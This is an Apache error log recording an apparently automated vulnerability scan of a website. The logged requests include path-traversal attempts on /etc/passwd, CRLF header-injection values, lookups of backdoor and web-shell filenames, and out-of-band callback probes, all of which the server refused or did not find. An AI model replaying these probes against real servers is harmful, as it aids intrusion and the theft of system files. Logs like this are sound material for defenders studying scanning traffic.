[Thu Jul 08 00:00:40.381451 2021] [autoindex:error] [pid 25921] [client 27.147.202.214:9213] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:01:18.144599 2021] [autoindex:error] [pid 25914] [client 27.147.202.214:12699] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:01:59.265667 2021] [autoindex:error] [pid 25828] [client 27.147.202.214:6522] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:02:35.172983 2021] [autoindex:error] [pid 25927] [client 27.147.202.214:1361] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:02:38.486477 2021] [autoindex:error] [pid 25928] [client 27.147.202.214:7490] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:02:40.174462 2021] [autoindex:error] [pid 25928] [client 27.147.202.214:7490] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 00:02:42.151003 2021] [autoindex:error] [pid 25928] [client 27.147.202.214:7490] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Thu Jul 08 02:28:58.137453 2021] [http:error] [pid 14630] [client 27.147.202.214:9876] AH02430: Response header 'Location' value of 'https://www.stocktuna.com/\n.example.com' contains invalid characters, aborting request
[Thu Jul 08 02:28:59.040488 2021] [php7:error] [pid 15533] [client 27.147.202.214:9902] script '/var/www/html/stocktuna.com/adminer-4.3.1.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:28:59.040581 2021] [php7:error] [pid 16435] [client 27.147.202.214:9903] script '/var/www/html/stocktuna.com/adminer-4.3.1-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:28:59.047750 2021] [php7:error] [pid 16434] [client 27.147.202.214:9919] script '/var/www/html/stocktuna.com/adminer-4.6.1-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:28:59.057160 2021] [php7:error] [pid 16284] [client 27.147.202.214:9878] script '/var/www/html/stocktuna.com/bitrix_server_test.php' not found or unable to stat
[Thu Jul 08 02:28:59.087500 2021] [php7:error] [pid 16436] [client 27.147.202.214:9889] script '/var/www/html/stocktuna.com/_adminer.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:28:59.222412 2021] [php7:error] [pid 16439] [client 27.147.202.214:9890] script '/var/www/html/stocktuna.com/adminer.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:28:59.700091 2021] [php7:error] [pid 16429] [client 27.147.202.214:9870] script '/var/www/html/stocktuna.com/Adminer.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:00.166974 2021] [php7:error] [pid 16394] [client 27.147.202.214:9906] script '/var/www/html/stocktuna.com/adminer-4.4.0.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:00.546800 2021] [php7:error] [pid 15895] [client 27.147.202.214:9904] script '/var/www/html/stocktuna.com/adminer-4.3.1-mysql-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:00.551219 2021] [php7:error] [pid 13381] [client 27.147.202.214:9920] script '/var/www/html/stocktuna.com/adminer-4.6.1-mysql-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:00.683818 2021] [php7:error] [pid 16444] [client 27.147.202.214:9908] script '/var/www/html/stocktuna.com/adminer-4.4.0-mysql-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:00.690733 2021] [php7:error] [pid 13681] [client 27.147.202.214:9892] script '/var/www/html/stocktuna.com/ad.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:00.691000 2021] [php7:error] [pid 14630] [client 27.147.202.214:9871] script '/var/www/html/stocktuna.com/adminer-4.3.0-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:00.730580 2021] [php7:error] [pid 12852] [client 27.147.202.214:9925] script '/var/www/html/stocktuna.com/adminer-4.6.2-mysql.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:00.837777 2021] [php7:error] [pid 15506] [client 27.147.202.214:9891] script '/var/www/html/stocktuna.com/ad.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:00.926264 2021] [php7:error] [pid 15507] [client 27.147.202.214:9910] script '/var/www/html/stocktuna.com/adminer-4.5.0.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:00.950545 2021] [php7:error] [pid 14641] [client 27.147.202.214:9921] script '/var/www/html/stocktuna.com/adminer-4.6.1-mysql.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:01.035213 2021] [php7:error] [pid 16358] [client 27.147.202.214:9911] script '/var/www/html/stocktuna.com/adminer-4.5.0-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:01.039562 2021] [php7:error] [pid 14890] [client 27.147.202.214:9924] script '/var/www/html/stocktuna.com/adminer-4.6.2-mysql-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:01.427220 2021] [php7:error] [pid 16326] [client 27.147.202.214:9907] script '/var/www/html/stocktuna.com/adminer-4.4.0-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:01.459831 2021] [core:error] [pid 16433] [client 27.147.202.214:9877] AH00126: Invalid URI in request GET /static/../../../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 02:29:01.965682 2021] [php7:error] [pid 16367] [client 27.147.202.214:9845] script '/var/www/html/stocktuna.com/opcache.php' not found or unable to stat
[Thu Jul 08 02:29:01.979510 2021] [php7:error] [pid 16313] [client 27.147.202.214:9922] script '/var/www/html/stocktuna.com/adminer-4.6.2.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:02.028853 2021] [php7:error] [pid 16433] [client 27.147.202.214:9900] script '/var/www/html/stocktuna.com/adminer-4.3.0-mysql-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:02.046473 2021] [php7:error] [pid 14809] [client 27.147.202.214:9872] script '/var/www/html/stocktuna.com/opcache.php' not found or unable to stat
[Thu Jul 08 02:29:02.894777 2021] [php7:error] [pid 13751] [client 27.147.202.214:9914] script '/var/www/html/stocktuna.com/adminer-4.6.0.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:03.362195 2021] [core:error] [pid 15465] [client 27.147.202.214:1459] AH00126: Invalid URI in request GET /%2e%2e/index.js HTTP/1.1
[Thu Jul 08 02:29:03.635907 2021] [core:error] [pid 16284] [client 27.147.202.214:9878] AH00126: Invalid URI in request GET /%2e%2e/debug.js HTTP/1.1
[Thu Jul 08 02:29:03.686055 2021] [php7:error] [pid 16321] [client 27.147.202.214:9905] script '/var/www/html/stocktuna.com/adminer-4.3.1-mysql.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:03.860546 2021] [php7:error] [pid 16403] [client 27.147.202.214:9918] script '/var/www/html/stocktuna.com/adminer-4.6.1.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:03.940386 2021] [core:error] [pid 16438] [client 27.147.202.214:9884] AH00126: Invalid URI in request GET /%2e%2e/release.js HTTP/1.1
[Thu Jul 08 02:29:04.067379 2021] [php7:error] [pid 16357] [client 27.147.202.214:9901] script '/var/www/html/stocktuna.com/adminer-4.3.0-mysql.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:04.201673 2021] [php7:error] [pid 16284] [client 27.147.202.214:9923] script '/var/www/html/stocktuna.com/adminer-4.6.2-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:04.533599 2021] [php7:error] [pid 16438] [client 27.147.202.214:9896] script '/var/www/html/stocktuna.com/adminer-4.2.5-mysql-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:04.568094 2021] [php7:error] [pid 16288] [client 27.147.202.214:9897] script '/var/www/html/stocktuna.com/adminer-4.2.5-mysql.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:04.600894 2021] [php7:error] [pid 15533] [client 27.147.202.214:9894] script '/var/www/html/stocktuna.com/adminer-4.2.5.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:04.604014 2021] [php7:error] [pid 16435] [client 27.147.202.214:9913] script '/var/www/html/stocktuna.com/adminer-4.5.0-mysql.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:04.604454 2021] [php7:error] [pid 16434] [client 27.147.202.214:9898] script '/var/www/html/stocktuna.com/adminer-4.3.0.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:04.655731 2021] [php7:error] [pid 16436] [client 27.147.202.214:9915] script '/var/www/html/stocktuna.com/adminer-4.6.0-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:04.769005 2021] [php7:error] [pid 16437] [client 27.147.202.214:9916] script '/var/www/html/stocktuna.com/adminer-4.6.0-mysql-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:04.794316 2021] [php7:error] [pid 16439] [client 27.147.202.214:9912] script '/var/www/html/stocktuna.com/adminer-4.5.0-mysql-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:05.123760 2021] [php7:error] [pid 14980] [client 27.147.202.214:9895] script '/var/www/html/stocktuna.com/adminer-4.2.5-en.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:05.855728 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/adminer-4.4.0-mysql.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:06.132007 2021] [php7:error] [pid 15895] [client 27.147.202.214:9917] script '/var/www/html/stocktuna.com/adminer-4.6.0-mysql.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:06.764732 2021] [authz_core:error] [pid 14630] [client 27.147.202.214:9887] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/server-status
[Thu Jul 08 02:29:07.066038 2021] [php7:error] [pid 16434] [client 27.147.202.214:9898] script '/var/www/html/stocktuna.com/coredumpcheck.php' not found or unable to stat
[Thu Jul 08 02:29:07.622235 2021] [http:error] [pid 14946] [client 27.147.202.214:9879] AH02430: Response header 'Location' value of 'https://www.stocktuna.com/\r\nheadername: headervalue' contains invalid characters, aborting request
[Thu Jul 08 02:29:08.965442 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/loader-wizard.php' not found or unable to stat
[Thu Jul 08 02:29:09.064083 2021] [http:error] [pid 16434] [client 27.147.202.214:3552] AH02430: Response header 'Location' value of 'https://www.stocktuna.com/\r\theadername: headervalue' contains invalid characters, aborting request
[Thu Jul 08 02:29:09.757184 2021] [http:error] [pid 15548] [client 27.147.202.214:3578] AH02430: Response header 'Location' value of 'https://www.stocktuna.com/\nheadername: headervalue' contains invalid characters, aborting request
[Thu Jul 08 02:29:10.380636 2021] [http:error] [pid 14713] [client 27.147.202.214:3582] AH02430: Response header 'Location' value of 'https://www.stocktuna.com/\rheadername: headervalue' contains invalid characters, aborting request
[Thu Jul 08 02:29:10.975725 2021] [http:error] [pid 14713] [client 27.147.202.214:3591] AH02430: Response header 'Location' value of 'https://www.stocktuna.com/~\r\nheadername: headervalue' contains invalid characters, aborting request
[Thu Jul 08 02:29:11.326519 2021] [core:error] [pid 16357] [client 27.147.202.214:9901] AH00126: Invalid URI in request GET @uri1.hit32725574808b445.group.bxss.me/ HTTP/1.1
[Thu Jul 08 02:29:12.478655 2021] [core:error] [pid 16436] [client 27.147.202.214:12629] AH00126: Invalid URI in request GET .uri3.hit32725574808b445.group.bxss.me/ HTTP/1.1
[Thu Jul 08 02:29:13.501175 2021] [authz_core:error] [pid 16321] [client 27.147.202.214:9905] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/server-status
[Thu Jul 08 02:29:13.514005 2021] [core:error] [pid 15507] [client 27.147.202.214:9951] AH00126: Invalid URI in request GET @bxss.me/rpb.png HTTP/1.1
[Thu Jul 08 02:29:14.513049 2021] [core:error] [pid 16441] [client 27.147.202.214:9882] AH00126: Invalid URI in request GET /sdk/../../../../../../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 02:29:15.616757 2021] [core:error] [pid 16439] [client 27.147.202.214:9912] AH00126: Invalid URI in request GET /../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 02:29:15.857288 2021] [php7:error] [pid 16321] [client 27.147.202.214:12666] script '/var/www/html/stocktuna.com/mx9zl6qs2ec4.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:21.422135 2021] [authz_core:error] [pid 16441] [client 27.147.202.214:12669] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/.htaccess
[Thu Jul 08 02:29:21.715883 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/apc.php' not found or unable to stat
[Thu Jul 08 02:29:22.021873 2021] [php7:error] [pid 16390] [client 27.147.202.214:12674] script '/var/www/html/stocktuna.com/webadmin.php' not found or unable to stat
[Thu Jul 08 02:29:22.022880 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/r57shell.php' not found or unable to stat
[Thu Jul 08 02:29:22.304417 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/r57.php' not found or unable to stat
[Thu Jul 08 02:29:22.311371 2021] [php7:error] [pid 13894] [client 27.147.202.214:12672] script '/var/www/html/stocktuna.com/phpinfo.php' not found or unable to stat
[Thu Jul 08 02:29:22.581477 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/r58.php' not found or unable to stat
[Thu Jul 08 02:29:22.858684 2021] [php7:error] [pid 16436] [client 27.147.202.214:12676] script '/var/www/html/stocktuna.com/c99shell.php' not found or unable to stat
[Thu Jul 08 02:29:22.880087 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/pi.php' not found or unable to stat
[Thu Jul 08 02:29:23.145935 2021] [php7:error] [pid 16436] [client 27.147.202.214:12676] script '/var/www/html/stocktuna.com/c99.php' not found or unable to stat
[Thu Jul 08 02:29:23.435293 2021] [php7:error] [pid 16436] [client 27.147.202.214:12676] script '/var/www/html/stocktuna.com/nstview.php' not found or unable to stat
[Thu Jul 08 02:29:23.456794 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/php.php' not found or unable to stat
[Thu Jul 08 02:29:23.720867 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/nst.php' not found or unable to stat
[Thu Jul 08 02:29:23.741252 2021] [php7:error] [pid 16436] [client 27.147.202.214:12676] script '/var/www/html/stocktuna.com/i.php' not found or unable to stat
[Thu Jul 08 02:29:24.012507 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/rst.php' not found or unable to stat
[Thu Jul 08 02:29:24.025807 2021] [php7:error] [pid 13751] [client 27.147.202.214:9914] script '/var/www/html/stocktuna.com/test.php' not found or unable to stat
[Thu Jul 08 02:29:24.300073 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/r57eng.php' not found or unable to stat
[Thu Jul 08 02:29:24.311179 2021] [php7:error] [pid 13751] [client 27.147.202.214:9914] script '/var/www/html/stocktuna.com/temp.php' not found or unable to stat
[Thu Jul 08 02:29:24.596160 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/shell.php' not found or unable to stat
[Thu Jul 08 02:29:24.600363 2021] [php7:error] [pid 13751] [client 27.147.202.214:9914] script '/var/www/html/stocktuna.com/info.php' not found or unable to stat
[Thu Jul 08 02:29:24.886704 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/dra.php' not found or unable to stat
[Thu Jul 08 02:29:25.173006 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/r.php' not found or unable to stat
[Thu Jul 08 02:29:25.456296 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/lol.php' not found or unable to stat
[Thu Jul 08 02:29:25.744236 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/zehir.php' not found or unable to stat
[Thu Jul 08 02:29:26.033672 2021] [php7:error] [pid 14809] [client 27.147.202.214:9909] script '/var/www/html/stocktuna.com/c-h.v2.php' not found or unable to stat
[Thu Jul 08 02:29:26.318221 2021] [php7:error] [pid 16438] [client 27.147.202.214:9896] script '/var/www/html/stocktuna.com/php-backdoor.php' not found or unable to stat
[Thu Jul 08 02:29:26.614738 2021] [php7:error] [pid 16438] [client 27.147.202.214:9896] script '/var/www/html/stocktuna.com/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 02:29:29.587491 2021] [php7:error] [pid 16468] [client 27.147.202.214:9987] script '/var/www/html/stocktuna.com/assets/s4lqm3gvxi9n.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:29.693679 2021] [php7:error] [pid 16436] [client 27.147.202.214:12676] script '/var/www/html/stocktuna.com/assets/css/lxoqicztllcy.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:30.370343 2021] [core:error] [pid 15506] [client 27.147.202.214:10008] AH00126: Invalid URI in request GET /assets/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 02:29:30.933040 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/js/hjwb7fays263.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:31.050451 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/rc0Enh7z.php' not found or unable to stat
[Thu Jul 08 02:29:31.372675 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/db.php' not found or unable to stat
[Thu Jul 08 02:29:31.510347 2021] [php7:error] [pid 12852] [client 27.147.202.214:10015] script '/var/www/html/stocktuna.com/app_dev.php' not found or unable to stat
[Thu Jul 08 02:29:31.960221 2021] [php7:error] [pid 16458] [client 27.147.202.214:10014] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:29:31.975114 2021] [php7:error] [pid 16480] [client 27.147.202.214:9744] script '/var/www/html/stocktuna.com/conf.php' not found or unable to stat
[Thu Jul 08 02:29:32.560461 2021] [php7:error] [pid 16480] [client 27.147.202.214:9744] script '/var/www/html/stocktuna.com/settings.php' not found or unable to stat
[Thu Jul 08 02:29:32.671174 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:29:33.153655 2021] [php7:error] [pid 16480] [client 27.147.202.214:9744] script '/var/www/html/stocktuna.com/config.php' not found or unable to stat
[Thu Jul 08 02:29:33.180874 2021] [php7:error] [pid 16450] [client 27.147.202.214:10020] script '/var/www/html/stocktuna.com/assets/js/apc.php' not found or unable to stat
[Thu Jul 08 02:29:33.784338 2021] [php7:error] [pid 16480] [client 27.147.202.214:9744] script '/var/www/html/stocktuna.com/config.inc.php' not found or unable to stat
[Thu Jul 08 02:29:34.098778 2021] [php7:error] [pid 16480] [client 27.147.202.214:9744] script '/var/www/html/stocktuna.com/localconfig.php' not found or unable to stat
[Thu Jul 08 02:29:34.727374 2021] [php7:error] [pid 16480] [client 27.147.202.214:9744] script '/var/www/html/stocktuna.com/configuration.php' not found or unable to stat
[Thu Jul 08 02:29:34.821898 2021] [authz_core:error] [pid 16367] [client 27.147.202.214:10010] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/js/.htaccess
[Thu Jul 08 02:29:35.353799 2021] [php7:error] [pid 16480] [client 27.147.202.214:9744] script '/var/www/html/stocktuna.com/settings.inc.php' not found or unable to stat
[Thu Jul 08 02:29:35.560406 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:29:35.663003 2021] [php7:error] [pid 16480] [client 27.147.202.214:9744] script '/var/www/html/stocktuna.com/global.inc.php' not found or unable to stat
[Thu Jul 08 02:29:35.947120 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/assets/js/phpinfo.php' not found or unable to stat
[Thu Jul 08 02:29:35.975673 2021] [php7:error] [pid 16480] [client 27.147.202.214:9744] script '/var/www/html/stocktuna.com/database.php' not found or unable to stat
[Thu Jul 08 02:29:36.206062 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:29:36.583106 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/assets/js/pi.php' not found or unable to stat
[Thu Jul 08 02:29:36.605541 2021] [php7:error] [pid 16480] [client 27.147.202.214:9744] script '/var/www/html/stocktuna.com/database.inc.php' not found or unable to stat
[Thu Jul 08 02:29:36.725560 2021] [php7:error] [pid 16458] [client 27.147.202.214:10014] script '/var/www/html/stocktuna.com/assets/css/apc.php' not found or unable to stat
[Thu Jul 08 02:29:36.886464 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:29:37.514696 2021] [authz_core:error] [pid 16450] [client 27.147.202.214:10020] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/css/.htaccess
[Thu Jul 08 02:29:37.528058 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc.php' not found or unable to stat
[Thu Jul 08 02:29:38.058337 2021] [php7:error] [pid 12852] [client 27.147.202.214:10015] script '/var/www/html/stocktuna.com/assets/css/phpinfo.php' not found or unable to stat
[Thu Jul 08 02:29:38.191963 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/soap.php' not found or unable to stat
[Thu Jul 08 02:29:38.259574 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/assets/js/php.php' not found or unable to stat
[Thu Jul 08 02:29:38.567812 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/assets/js/i.php' not found or unable to stat
[Thu Jul 08 02:29:38.607115 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/r57shell.php' not found or unable to stat
[Thu Jul 08 02:29:38.653355 2021] [php7:error] [pid 13894] [client 27.147.202.214:10009] script '/var/www/html/stocktuna.com/assets/css/webadmin.php' not found or unable to stat
[Thu Jul 08 02:29:38.678044 2021] [php7:error] [pid 12852] [client 27.147.202.214:10015] script '/var/www/html/stocktuna.com/assets/css/pi.php' not found or unable to stat
[Thu Jul 08 02:29:38.872509 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/soap.php' not found or unable to stat
[Thu Jul 08 02:29:38.921761 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/r57.php' not found or unable to stat
[Thu Jul 08 02:29:39.156783 2021] [php7:error] [pid 16437] [client 27.147.202.214:10012] script '/var/www/html/stocktuna.com/assets/apc.php' not found or unable to stat
[Thu Jul 08 02:29:39.214919 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/r58.php' not found or unable to stat
[Thu Jul 08 02:29:39.301852 2021] [php7:error] [pid 12852] [client 27.147.202.214:10015] script '/var/www/html/stocktuna.com/assets/css/php.php' not found or unable to stat
[Thu Jul 08 02:29:39.382797 2021] [authz_core:error] [pid 14630] [client 27.147.202.214:9887] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/.htaccess~
[Thu Jul 08 02:29:39.396520 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/assets/js/test.php' not found or unable to stat
[Thu Jul 08 02:29:39.491334 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/soap.php' not found or unable to stat
[Thu Jul 08 02:29:39.494206 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/c99shell.php' not found or unable to stat
[Thu Jul 08 02:29:39.611053 2021] [php7:error] [pid 16284] [client 27.147.202.214:10002] script '/var/www/html/stocktuna.com/assets/css/i.php' not found or unable to stat
[Thu Jul 08 02:29:39.683133 2021] [authz_core:error] [pid 14630] [client 27.147.202.214:9887] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/.htaccess.old
[Thu Jul 08 02:29:39.686425 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/assets/js/temp.php' not found or unable to stat
[Thu Jul 08 02:29:39.795904 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/c99.php' not found or unable to stat
[Thu Jul 08 02:29:39.915131 2021] [php7:error] [pid 16284] [client 27.147.202.214:10002] script '/var/www/html/stocktuna.com/assets/css/test.php' not found or unable to stat
[Thu Jul 08 02:29:39.995962 2021] [authz_core:error] [pid 14630] [client 27.147.202.214:9887] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/.htaccess.save
[Thu Jul 08 02:29:39.996054 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/assets/js/info.php' not found or unable to stat
[Thu Jul 08 02:29:40.103088 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/nstview.php' not found or unable to stat
[Thu Jul 08 02:29:40.129361 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/soap.php' not found or unable to stat
[Thu Jul 08 02:29:40.234996 2021] [php7:error] [pid 16284] [client 27.147.202.214:10002] script '/var/www/html/stocktuna.com/assets/css/temp.php' not found or unable to stat
[Thu Jul 08 02:29:40.405401 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/nst.php' not found or unable to stat
[Thu Jul 08 02:29:40.549790 2021] [php7:error] [pid 16284] [client 27.147.202.214:10002] script '/var/www/html/stocktuna.com/assets/css/info.php' not found or unable to stat
[Thu Jul 08 02:29:40.650111 2021] [authz_core:error] [pid 16437] [client 27.147.202.214:10012] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/.htaccess
[Thu Jul 08 02:29:40.717876 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/rst.php' not found or unable to stat
[Thu Jul 08 02:29:40.785110 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 02:29:41.022325 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/r57eng.php' not found or unable to stat
[Thu Jul 08 02:29:41.251406 2021] [php7:error] [pid 16436] [client 27.147.202.214:12676] script '/var/www/html/stocktuna.com/login.php' not found or unable to stat
[Thu Jul 08 02:29:41.329433 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/shell.php' not found or unable to stat
[Thu Jul 08 02:29:41.432623 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 02:29:41.614305 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/dra.php' not found or unable to stat
[Thu Jul 08 02:29:41.726446 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/phpinfo.php' not found or unable to stat
